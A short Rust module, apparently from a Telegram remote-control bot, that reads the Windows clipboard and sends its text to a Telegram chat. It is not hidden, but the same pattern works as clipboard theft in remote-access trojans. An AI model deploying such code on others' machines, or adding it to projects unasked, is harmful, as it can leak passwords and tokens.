use anyhow::Result;
use clipboard_win::{formats, get_clipboard};
use teloxide::prelude::*;
use teloxide::types::{ChatId, MessageId};

use crate::bot::md;

pub async fn clipboard(bot: &Bot, chat_id: ChatId, reply_to: MessageId) -> Result<()> {
    let text: String = get_clipboard(formats::Unicode).unwrap_or_default();

    if text.is_empty() {
        md::send(bot, chat_id, reply_to, "📭 Clipboard trống".to_string()).await?;
    } else {
        let text = crate::bot::truncate_str(&text, 3800);
        md::send(bot, chat_id, reply_to, format!("*📋 Clipboard:*\n\n{}", md::escape(&text))).await?;
    }

    Ok(())
}
